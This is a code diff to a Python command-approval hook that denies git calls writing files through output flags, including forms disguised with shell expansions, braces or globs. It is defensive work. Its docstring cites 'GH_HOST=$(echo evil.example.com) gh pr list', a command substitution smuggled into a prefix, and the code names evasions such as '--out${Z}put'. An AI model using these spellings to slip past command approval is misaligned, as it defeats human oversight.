@@ -27,16 +27,18 @@ does not approve a gh command in which an expansion can form or change an option
 That includes a command substitution inside a ``GH_HOST=`` / ``GH_REPO=`` prefix value:
 ``GH_HOST=$(echo evil.example.com) gh pr list`` is read as the literal text.
 
-It answers for ``git`` too. git reads ``--output`` in its diff and revision options, so every
-git command that takes them, a granted read such as ``git log``, ``git diff`` or ``git show``
-included, writes the file that option names; ``format-patch`` and ``archive`` also take ``-o``.
-A git call with one of those flags is refused, except one that names ``/dev/null``,
-``/dev/stdout`` or ``/dev/stderr``. It is found the way a gh call is: past assignment prefixes,
-redirections and wrappers, and past git's own options (``git -C DIR log``).
+It answers for ``git`` too: it refuses a git call that writes a file through an output flag,
+``--output`` (or a leading part of that name, or ``--output-directory``) on any verb and ``-o`` on
+``diff``, ``log``, ``show``, ``format-patch``, ``archive`` and ``bundle``, except one that names
+``/dev/null``, ``/dev/stdout`` or ``/dev/stderr``. It finds the call the way it finds a gh call:
+past assignment prefixes, redirections and wrappers, and past git's own options (``git -C DIR
+log``). Unlike the gh rule, it also reads an option an expansion can form (``--out${Z}put``,
+``$'--output'``, a brace list), so the git rule does not rest on the approver.
 """
 
 from __future__ import annotations
 
+import fnmatch
 import re
 import shlex
 import sys
@@ -565,6 +567,15 @@ _GIT_OPTION_VALUE = {"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--s
                      "--config-env", "--attr-source"}
 # Output written here changes no file.
 _GIT_NO_FILE = {"/dev/null", "/dev/stdout", "/dev/stderr"}
+# The shell expands a word before git reads it, and the decider reads the text after quote removal, where
+# `$'...'` and `$"..."` have become `$...`. So a word with an expansion in it is read as written, without
+# its `$` signs, with every expansion taken as empty, and with a `${X-word}` form taken as its word; a
+# brace list gives each of its words.
+_GIT_EXPANSION = re.compile(r"\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*|\$[0-9@*#?$!-]")
+_GIT_DEFAULT_WORD = re.compile(r"\$\{[A-Za-z_][A-Za-z0-9_]*:?[-=+?]([^}]*)\}")
+_GIT_BRACE_LIST = re.compile(r"\{([^{}]*,[^{}]*)\}")
+_GIT_EXPANDS = set("${")
+_GIT_GLOB = set("*?[")
 
 
 def _git_command_words(tokens: list[str]) -> list[list[str]]:
@@ -599,6 +610,27 @@ def _git_command_words(tokens: list[str]) -> list[list[str]]:
     return out
 
 
+def _git_spellings(arg: str) -> set[str]:
+    """The words a git argument can reach git as once the shell expands it."""
+    if not _GIT_EXPANDS & set(arg):
+        return {arg}
+    forms = {arg, arg.replace("$", ""), _GIT_EXPANSION.sub("", arg), _GIT_DEFAULT_WORD.sub(lambda m: m.group(1), arg)}
+    out = set(forms)
+    for form in forms:
+        m = _GIT_BRACE_LIST.search(form)
+        if m:
+            out.update(form[: m.start()] + alt + form[m.end() :] for alt in m.group(1).split(","))
+    return out
+
+
+def _git_output_name(name: str) -> bool:
+    """Whether a long option's name is --output, --output-directory or a leading part of either, or a glob
+    the shell could match to one."""
+    if name.startswith("--ou") and _GIT_OUTPUT_NAME.startswith(name):
+        return True
+    return bool(_GIT_GLOB & set(name)) and any(fnmatch.fnmatchcase(n, name) for n in ("--output", _GIT_OUTPUT_NAME))
+
+
 def _inspect_git_args(args: list[str]) -> str | None:
     """Return a deny reason for one git invocation's argument list, or ``None``."""
     i = 0
@@ -606,18 +638,23 @@ def _inspect_git_args(args: list[str]) -> str | None:
         i += 2 if args[i] in _GIT_OPTION_VALUE else 1
     verb = args[i] if i < len(args) else ""
     rest = args[i + 1 :]
+    # a verb an expansion forms could be any verb, so it is read as the strictest one
+    known = verb if not (_GIT_EXPANDS | _GIT_GLOB) & set(verb) else "format-patch"
     for k, arg in enumerate(rest):
         if arg in ("--", "--end-of-options"):
             break  # what follows is a path or a revision, not an option
-        name, eq, value = arg.partition("=")
-        if name.startswith("--ou") and _GIT_OUTPUT_NAME.startswith(name):
-            target = value if eq else (rest[k + 1] if k + 1 < len(rest) else "")
-            if target in _GIT_NO_FILE:
-                continue
-            return f"git {verb} {name} writes its output to a file; run it without {name} and read the output"
-        if arg.startswith("-") and not arg.startswith("--"):
-            if (verb in _GIT_DASH_O and arg.startswith("-o")) or (verb in _GIT_DASH_O_CLUSTER and "o" in arg[1:]):
-                return f"git {verb} -o writes its output to a file; run it without -o and read the output"
+        for word in _git_spellings(arg):
+            name, eq, value = word.partition("=")
+            if _git_output_name(name):
+                target = value if eq else (rest[k + 1] if k + 1 < len(rest) else "")
+                if word == arg and target in _GIT_NO_FILE:
+                    continue
+                return f"git {verb} {name} writes its output to a file; run it without {name} and read the output"
+            if word.startswith("-") and not word.startswith("--"):
+                if (known in _GIT_DASH_O and word.startswith("-o")) or (
+                    known in _GIT_DASH_O_CLUSTER and "o" in word[1:]
+                ):
+                    return f"git {verb} -o writes its output to a file; run it without -o and read the output"
     return None
 
 
